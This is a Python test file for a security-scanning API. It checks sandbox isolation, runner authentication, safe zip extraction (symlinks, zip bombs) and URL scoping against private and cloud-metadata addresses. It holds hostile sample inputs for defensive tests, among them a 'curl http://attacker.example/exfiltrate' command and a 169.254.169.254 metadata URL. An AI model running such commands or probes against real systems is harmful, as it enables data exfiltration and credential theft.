import io
from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile, ZipInfo

import pytest
import httpx
from fastapi import HTTPException, UploadFile
from fastapi.testclient import TestClient

from nope_api.config import Settings
from nope_api.ingestion import extract_zip
from nope_api.models import AuthorizationScope
from nope_api.runner import app as runner_app
from nope_api.sandbox import DockerSandbox, SandboxWorkflow
from nope_api.security import validate_url_scope
from nope_api.url_scanner import scan_url


class RecordingExecutor:
    def __init__(self):
        self.commands = []

    def run(self, command, timeout_seconds):
        from nope_api.sandbox import SandboxCommandResult

        self.commands.append(command)
        return SandboxCommandResult(status="passed", name=command[0], command=command)


def _zip_upload(entries: dict[str, bytes], attrs: dict[str, int] | None = None, *, compression: int | None = None) -> UploadFile:
    body = io.BytesIO()
    with ZipFile(body, "w") as archive:
        for name, data in entries.items():
            info = ZipInfo(name)
            if attrs and name in attrs:
                info.external_attr = attrs[name]
            archive.writestr(info, data, compress_type=compression)
    body.seek(0)
    return UploadFile(filename="repo.zip", file=body)


def test_stage3_compose_worker_is_socketless_and_runner_owns_docker_boundary():
    compose = Path("docker-compose.yml").read_text(encoding="utf-8")
    worker_block = compose.split("\n  nope-worker:", 1)[1].split("\n  nope-runner:", 1)[0]
    runner_block = compose.split("\n  nope-runner:", 1)[1].split("\n  nope-postgres:", 1)[0]

    assert "user: root" not in worker_block
    assert "/var/run/docker.sock" not in worker_block
    assert "no-new-privileges:true" in worker_block
    assert "cap_drop:" in worker_block
    assert "NOPE_SANDBOX_RUNNER_URL" in worker_block
    assert "user: root" in runner_block
    assert "/var/run/docker.sock:/var/run/docker.sock" in runner_block
    assert "NOPE_SANDBOX_RUNNER_TOKEN" in runner_block


def test_stage3_sandbox_rejects_arbitrary_images_commands_networks_and_env(tmp_path):
    executor = RecordingExecutor()
    sandbox = DockerSandbox(Settings(sandbox_network_enabled=True), tmp_path, executor)

    arbitrary_image = sandbox.run_workflow(
        SandboxWorkflow(name="bad image", image="evil/latest", kind="custom", command="python -m compileall .")
    )
    arbitrary_command = sandbox.run_workflow(
        SandboxWorkflow(name="bad command", kind="python", command="curl http://attacker.example/exfiltrate")
    )
    allowed = sandbox.run_workflow(
        SandboxWorkflow(name="allowed", kind="python", command="python -m compileall .", network="host")
    )

    rendered = " ".join(executor.commands[0])
    assert arbitrary_image.status == "unsupported"
    assert arbitrary_command.status == "unsupported"
    assert allowed.status == "passed"
    assert "--network none" in rendered
    assert "--env NOPE_SANDBOX=1" in rendered
    assert "NOPE_MINIO" not in rendered
    assert "/var/run/docker.sock" not in rendered
    assert "type=bind" in rendered and "readonly" in rendered


def test_stage3_runner_rejects_bad_token_and_workspace_escape(tmp_path):
    controlled = tmp_path / "controlled"
    controlled.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    from nope_api import runner as runner_module

    runner_module.settings = Settings(temp_root=controlled, sandbox_runner_token="runner-secret", sandbox_enabled=False)
    with TestClient(runner_app) as client:
        unauth = client.post("/runner/sandbox", json={"workspace_path": str(controlled)})
        escape = client.post(
            "/runner/sandbox",
            headers={"authorization": "Bearer runner-secret"},
            json={"workspace_path": str(outside)},
        )

    assert unauth.status_code == 401
    assert escape.status_code == 400


@pytest.mark.asyncio
async def test_stage3_zip_rejects_symlink_special_duplicate_deep_long_and_bomb(tmp_path):
    settings = Settings(temp_root=tmp_path, max_archive_nesting_depth=3, max_archive_path_length=30, max_archive_compression_ratio=10, max_file_count=1)
    cases = [
        _zip_upload({"link": b"x"}, {"link": (0o120000 << 16)}),
        _zip_upload({"fifo": b"x"}, {"fifo": (0o010000 << 16)}),
        _zip_upload({"a.txt": b"1", "A.TXT": b"2"}),
        _zip_upload({"e\u0301.txt": b"1", "\u00e9.txt": b"2"}),
        _zip_upload({"one.txt": b"1", "two.txt": b"2"}),
        _zip_upload({"a/b/c/d.txt": b"x"}),
        _zip_upload({"a" * 31: b"x"}),
        _zip_upload({"bomb.txt": b"0" * 2048}, compression=ZIP_DEFLATED),
    ]
    for index, upload in enumerate(cases):
        with pytest.raises(HTTPException):
            await extract_zip(upload, f"stage3_bad_zip_{index}", settings)


def test_stage3_url_scope_blocks_credentials_ports_private_and_metadata(monkeypatch):
    settings = Settings()
    auth = AuthorizationScope(confirmed=True)

    with pytest.raises(HTTPException):
        validate_url_scope("https://user:pass@example.com", auth, settings)
    with pytest.raises(HTTPException):
        validate_url_scope("https://example.com:4443", AuthorizationScope(confirmed=True), settings)
    with pytest.raises(HTTPException):
        validate_url_scope("http://127.0.0.1", AuthorizationScope(confirmed=True), settings)
    with pytest.raises(HTTPException):
        validate_url_scope("http://169.254.169.254/latest/meta-data", AuthorizationScope(confirmed=True), settings)

    monkeypatch.setattr("nope_api.security.resolve_host_addresses", lambda hostname: [])
    with pytest.raises(HTTPException):
        validate_url_scope("https://example.com", AuthorizationScope(confirmed=True), settings)


class FakeStreamResponse:
    def __init__(self, url: str, *, status_code: int = 200, headers: dict[str, str] | None = None, chunks: list[bytes] | None = None):
        self.status_code = status_code
        self.headers = headers or {}
        self.request = httpx.Request("GET", url)
        self.extensions = {}
        self._chunks = chunks or [b"ok"]

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc, tb):
        return False

    async def aiter_bytes(self):
        for chunk in self._chunks:
            yield chunk


class FakeAsyncClient:
    responses: list[FakeStreamResponse] = []

    def __init__(self, *args, **kwargs):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc, tb):
        return False

    def stream(self, method: str, url: str, **kwargs):
        if self.responses:
            return self.responses.pop(0)
        return FakeStreamResponse(url)


@pytest.mark.asyncio
async def test_stage3_url_scanner_blocks_unsafe_redirects_and_oversized_responses(monkeypatch):
    monkeypatch.setattr("nope_api.url_scanner.httpx.AsyncClient", FakeAsyncClient)
    monkeypatch.setattr("nope_api.url_scanner.validate_resolved_addresses", lambda hostname, settings: ["93.184.216.34"])

    FakeAsyncClient.responses = [FakeStreamResponse("https://example.com", status_code=302, headers={"location": "http://127.0.0.1/admin"})]
    findings, runs, _coverage = await scan_url("https://example.com", Settings())
    assert runs[0].status == "passed"
    assert any(finding.original_rule_id == "url-open-redirect" for finding in findings)

    FakeAsyncClient.responses = [FakeStreamResponse("https://example.com", chunks=[b"x" * 8, b"y" * 8])]
    _findings, runs, coverage = await scan_url("https://example.com", Settings(url_scan_max_response_bytes=8))
    assert runs[0].status == "failed"
    assert "maximum size" in (runs[0].message or "")
    assert coverage[0].status.value == "Failed"
